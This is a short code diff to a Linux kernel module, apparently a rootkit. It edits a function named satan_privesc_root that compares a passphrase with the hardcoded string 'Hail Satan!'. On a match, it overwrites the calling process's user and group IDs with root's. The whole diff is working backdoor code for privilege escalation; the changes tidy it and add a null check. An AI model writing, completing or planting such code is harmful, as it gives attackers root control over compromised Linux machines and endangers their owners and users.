@@ -2,8 +2,11 @@
 #include "privesc.h"
 
 #include <linux/cred.h>
+#include <linux/uaccess.h>
 
 #define PRIVESC_PASS "Hail Satan!"
+
+static struct cred *cred = NULL;
 
 
 /**
@@ -14,11 +17,14 @@
  */
 int satan_privesc_root(const char *passphrase)
 {
-        if (strncmp(passphrase, PRIVESC_PASS, strlen(PRIVESC_PASS))) {
+        if (strncmp(passphrase, PRIVESC_PASS, strlen(PRIVESC_PASS)))
                 return 1;
-        }
 
-	cred = (struct cred *) __task_cred(current);
+        cred = (struct cred *) __task_cred(current);
+
+        if (!cred)
+                return 1;
+
 	cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
 	cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
         return 0;
